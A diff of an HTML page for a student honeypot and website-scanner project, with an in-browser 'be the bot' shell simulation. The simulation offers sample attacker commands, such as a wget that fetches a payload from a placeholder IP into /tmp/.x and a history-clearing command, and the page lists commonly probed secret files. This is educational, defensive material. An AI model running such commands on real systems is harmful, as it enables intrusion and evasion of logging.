@@ -33,31 +33,28 @@
 </nav>
 
 <main>
-  <section class="scene" id="top" data-scene="0" data-p="0">
+  <section class="scene" id="top" data-scene="0" data-p="0" data-bg="#d9150f" data-accent="#2b59ff">
     <div class="copy">
       <p class="kicker">Senior project · Cybersecurity · 2026</p>
       <h1>We set a trap<br>for hackers.</h1>
-      <p class="lede">A honeypot, a website scanner, and a study of the small businesses of Upstate South Carolina.</p>
       <p class="hint" aria-hidden="true">Scroll · click anything</p>
     </div>
   </section>
 
-  <div class="ticker" aria-hidden="true"><div>/.env ✦ /.git/config ✦ /wp-login.php ✦ /backup.sql ✦ /phpinfo.php ✦ /.htpasswd ✦ /server-status ✦ /wp-config.php.bak ✦ /.DS_Store ✦&nbsp;</div></div>
+  <div class="ticker" aria-hidden="true"><div>/.env ✦ /.git/config ✦ /wp-login.php ✦ /backup.sql ✦ /phpinfo.php ✦ /.htpasswd ✦ /server-status ✦&nbsp;</div></div>
 
-  <section class="scene" id="bait" data-scene="1" data-p=".238">
+  <section class="scene" id="bait" data-scene="1" data-p=".238" data-bg="#2340d6" data-accent="#ff5fa2">
     <div class="copy">
       <p class="kicker">01 — The bait</p>
-      <h2>Something sweet, left out in the open.</h2>
-      <p>A honeypot is a server built to be attacked. It pretends to be a real machine — an SSH login, a Telnet prompt, a WordPress admin page — and quietly writes down everything that touches it.</p>
-      <p>Nobody has a legitimate reason to connect to it. So every single connection is a scan or an attack.</p>
+      <h2>A server built to be attacked.</h2>
+      <p class="big">No one has a reason to visit it. So every visitor is a bot.</p>
     </div>
   </section>
 
-  <section class="scene play" id="anatomy" data-p=".42">
+  <section class="scene play" id="anatomy" data-p=".42" data-bg="#0e8f62" data-accent="#ff5fa2">
     <div class="copy panel-host">
-      <p class="kicker">Interactive — Inside the trap</p>
+      <p class="kicker">Try it — Inside the trap</p>
       <h2>Four doors. Three are fake.</h2>
-      <p>The firewall lets the internet knock on four ports. Pick one to see what's behind it and what gets written down.</p>
       <div class="panel anatomy">
         <div class="ports" role="tablist" aria-label="Ports">
           <button role="tab" aria-selected="true" data-port="22"><b>22</b><span>SSH</span></button>
@@ -68,89 +65,79 @@
         <div class="lane" aria-hidden="true"><span>internet</span><i class="packet"></i><span>firewall</span><i class="packet late"></i><span class="lane-end">cowrie</span></div>
         <div class="port-detail" role="tabpanel" aria-live="polite"></div>
         <form class="probe" hidden>
-          <label for="probe-path">Ask the fake website for a path</label>
-          <div class="row"><span class="get">GET</span><input id="probe-path" value="/.env" autocomplete="off" spellcheck="false"><button>Send</button></div>
+          <div class="row"><span class="get">GET</span><input id="probe-path" value="/.env" autocomplete="off" spellcheck="false" aria-label="Path to request"><button>Send</button></div>
           <div class="chips"><button type="button">/</button><button type="button">/.env</button><button type="button">/wp-login.php</button><button type="button">/.git/config</button></div>
           <pre class="probe-out"></pre>
         </form>
-        <p class="fine">Outbound, the firewall allows only DNS, time sync and web traffic. If anything ever escaped the fake shell, it couldn't use this server to attack anyone else.</p>
       </div>
     </div>
   </section>
 
-  <section class="scene" id="swarm" data-scene="2" data-p=".476">
+  <section class="scene" id="swarm" data-scene="2" data-p=".476" data-bg="#e8550c" data-accent="#2b59ff">
     <div class="copy">
       <p class="kicker">02 — The swarm</p>
       <h2>The bots don't take long.</h2>
-      <p>Our hypothesis: the first password guess lands within an hour of going online, and the first request for a leaked <code>/.env</code> file within a day. The honeypot goes live next — its real numbers will replace this sentence.</p>
+      <p class="big">Our bet: first password guess within an hour.</p>
     </div>
   </section>
 
-  <section class="scene play" id="bot" data-p=".67">
-    <div class="copy wide">
-      <p class="kicker">Interactive — Be the bot</p>
-      <h2>You're in. Now act like a bot.</h2>
-      <p class="lede-sm">Bots guess passwords like <code>root</code> / <code>123456</code>, and Cowrie lets some of them "succeed" into a fake Linux machine. Type a command, or let a bot script run. Each line is logged and tagged with a <a href="https://attack.mitre.org/" target="_blank" rel="noopener">MITRE ATT&amp;CK</a> technique by the same rules our analysis uses.</p>
-      <div class="bot-grid">
-        <div class="panel term">
-          <div class="term-bar"><i></i><i></i><i></i><span>root@web-prod-02 — ssh</span></div>
-          <div class="term-out" role="log" aria-live="polite"></div>
-          <form class="term-in">
-            <label for="cmd">root@web-prod-02:~#</label>
-            <input id="cmd" autocomplete="off" autocapitalize="off" spellcheck="false" aria-label="Type a shell command">
-          </form>
-        </div>
-        <aside class="panel ttp">
-          <h3>What the analysis sees</h3>
-          <ol class="chain">
-            <li data-tactic="Discovery">Discovery</li>
-            <li data-tactic="Execution">Execution</li>
-            <li data-tactic="Persistence">Persistence</li>
-            <li data-tactic="Defense Evasion">Defense evasion</li>
-            <li data-tactic="Command and Control">Command &amp; control</li>
-            <li data-tactic="Impact">Impact</li>
-          </ol>
-          <ul class="tech-list"><li class="empty">Nothing yet. Try <code>uname -a</code>.</li></ul>
-          <p class="log-label">Last log line</p>
-          <pre class="log-line">waiting…</pre>
-        </aside>
+  <section class="scene play" id="bot" data-p=".67" data-bg="#131111" data-accent="#39e07a">
+    <div class="copy">
+      <p class="kicker">Try it — Be the bot</p>
+      <h2>You're in. Act like a bot.</h2>
+      <div class="panel term">
+        <div class="term-bar"><i></i><i></i><i></i><span>root@web-prod-02 — ssh</span></div>
+        <div class="term-out" role="log" aria-live="polite"></div>
+        <form class="term-in">
+          <label for="cmd">root@web-prod-02:~#</label>
+          <input id="cmd" autocomplete="off" autocapitalize="off" spellcheck="false" aria-label="Type a shell command">
+        </form>
       </div>
       <div class="chips cmd-chips">
-        <button type="button" class="run-bot">▶ Run a bot script</button>
+        <button type="button" class="run-bot">▶ Run a bot</button>
         <button type="button">uname -a</button>
-        <button type="button">cat /proc/cpuinfo | grep name | wc -l</button>
-        <button type="button">wget http://203.0.113.7/x86 -O /tmp/.x</button>
+        <button type="button">wget http://203.0.113.7/x86</button>
         <button type="button">crontab -l</button>
         <button type="button">history -c</button>
       </div>
-      <p class="fine">Simulated in your browser. These are typical commands, not captured data. The real log fills in once the honeypot is live.</p>
+      <aside class="panel ttp">
+        <ol class="chain">
+          <li data-tactic="Discovery">Discovery</li>
+          <li data-tactic="Execution">Execution</li>
+          <li data-tactic="Persistence">Persistence</li>
+          <li data-tactic="Defense Evasion">Evasion</li>
+          <li data-tactic="Command and Control">C2</li>
+          <li data-tactic="Impact">Impact</li>
+        </ol>
+        <ul class="tech-list"><li class="empty">MITRE ATT&amp;CK techniques show up here.</li></ul>
+      </aside>
+      <p class="fine">Simulated. Typical commands, not captured data.</p>
     </div>
   </section>
 
-  <section class="scene" id="lock" data-scene="3" data-p=".714">
+  <section class="scene" id="lock" data-scene="3" data-p=".714" data-bg="#6a2bd9" data-accent="#ff8a1f">
     <div class="copy">
       <p class="kicker">03 — The lock</p>
-      <h2>Then we check the doors they try.</h2>
-      <p>Every path the bots probe for — <code>/.env</code>, <code>/.git</code>, forgotten backups — becomes a check in our scanner. It grades a business website in plain English, using only public information unless the owner signs off in writing.</p>
+      <h2>Every door they try becomes a check.</h2>
     </div>
   </section>
 
-  <div class="ticker reverse" aria-hidden="true"><div>SPF ✦ DMARC ✦ HSTS ✦ CSP ✦ TLS 1.3 ✦ nosniff ✦ X-Frame-Options ✦ Referrer-Policy ✦ certificate ✦&nbsp;</div></div>
+  <div class="ticker reverse" aria-hidden="true"><div>SPF ✦ DMARC ✦ HSTS ✦ CSP ✦ TLS 1.3 ✦ nosniff ✦ X-Frame-Options ✦ Referrer-Policy ✦&nbsp;</div></div>
 
-  <section class="scene play" id="grader" data-p=".955">
-    <div class="copy wide">
-      <p class="kicker">Interactive — Grade a site</p>
-      <h2>Fix it yourself. Watch the grade move.</h2>
-      <p class="lede-sm">These are the real problems our scanner found on <b>etceterabusiness.com</b> on 1 November 2026. Click a problem to fix it. Each one costs points by severity: high 20, medium 10, low 4, and warnings half.</p>
+  <section class="scene play" id="grader" data-p=".955" data-bg="#0a7d8c" data-accent="#ff5fa2">
+    <div class="copy">
+      <p class="kicker">Try it — Grade a site</p>
+      <h2>Fix it. Watch the grade.</h2>
+      <p class="small-note">Our real scan of etceterabusiness.com, 1 Nov 2026.</p>
       <div class="grader">
         <div class="panel grade-card">
           <p class="grade-letter" aria-live="polite">F</p>
           <p class="grade-score"><span>35</span> / 100</p>
           <div class="meter" aria-hidden="true"><i></i><b style="left:60%"></b><b style="left:70%"></b><b style="left:80%"></b><b style="left:90%"></b></div>
           <div class="chips">
-            <button type="button" data-preset="start">Nov 1, before</button>
-            <button type="button" data-preset="now">Live today</button>
-            <button type="button" data-preset="all">Fix everything</button>
+            <button type="button" data-preset="start">Before</button>
+            <button type="button" data-preset="now">Today</button>
+            <button type="button" data-preset="all">All fixed</button>
           </div>
         </div>
         <ul class="issues"></ul>
@@ -158,38 +145,38 @@
     </div>
   </section>
 
-  <section class="scene results" id="results" data-scene="4" data-p=".96">
+  <section class="scene results" id="results" data-scene="4" data-p=".96" data-bg="#131111" data-accent="#f9d72e">
     <div class="copy wide">
       <p class="kicker">04 — So far</p>
-      <h2>It works. We tested it.</h2>
+      <h2>It works.</h2>
       <div class="stats">
-        <article>
+        <article class="c1">
           <p class="num">100<small>%</small> <span>vs</span> 30<small>%</small></p>
-          <p>Precision on exposed-file checks: reading the file's contents, versus trusting the status code like simple scanners do. Seven lab sites, 25 planted flaws.</p>
+          <p>Precision on exposed files, vs. a simple scanner.</p>
         </article>
-        <article>
+        <article class="c2">
           <p class="num">F <span>→</span> D</p>
-          <p>Our own website, 35 to 60 out of 100, after one deploy of security headers. Two DNS records away from an A.</p>
+          <p>Our own site after one fix. Two DNS records from an A.</p>
         </article>
-        <article>
+        <article class="c3">
           <p class="num">8</p>
-          <p>Experiments on the tracker. The honeypot and the regional study are next, and nothing here is filled in before the data is.</p>
+          <p>Experiments. Honeypot data is next.</p>
         </article>
       </div>
     </div>
   </section>
 
-  <section class="scene play rules" id="rules" data-p="1">
+  <section class="scene play rules" id="rules" data-p="1" data-bg="#d42a68" data-accent="#2b59ff">
     <div class="copy wide">
-      <p class="kicker">05 — The rules we play by</p>
-      <h2>Hacking-adjacent, done honestly.</h2>
+      <p class="kicker">05 — The rules</p>
+      <h2>Done honestly.</h2>
       <div class="rule-grid">
-        <article class="panel"><b>01</b><h3>Public by default</h3><p>The study only reads what any visitor's browser already sees: DNS records, one TLS handshake, one homepage load.</p></article>
-        <article class="panel"><b>02</b><h3>Permission in writing</h3><p>Checks for exposed files like <code>/.env</code> refuse to run without a signed, unexpired authorization from the owner.</p></article>
-        <article class="panel"><b>03</b><h3>Nobody gets named</h3><p>Regional results are reported in aggregate. No small business ends up on a list of weak sites.</p></article>
-        <article class="panel"><b>04</b><h3>Malware stays caged</h3><p>Files attackers download never leave the honeypot server. Only their SHA-256 fingerprints come home.</p></article>
+        <article class="panel"><span class="icon" aria-hidden="true">◎</span><h3>Public only</h3><p>Nothing a browser can't see.</p></article>
+        <article class="panel"><span class="icon" aria-hidden="true">✍</span><h3>Permission</h3><p>Deep checks need it in writing.</p></article>
+        <article class="panel"><span class="icon" aria-hidden="true">◐</span><h3>No names</h3><p>Results in aggregate only.</p></article>
+        <article class="panel"><span class="icon" aria-hidden="true">⛓</span><h3>Malware caged</h3><p>Only fingerprints come home.</p></article>
       </div>
-      <p class="foot">Built by CJ Rickert · ETC Business Systems · <a href="#top">Back to the top ↑</a></p>
+      <p class="foot">Built by CJ Rickert · ETC Business Systems · <a href="#top">Back to top ↑</a></p>
     </div>
   </section>
 </main>
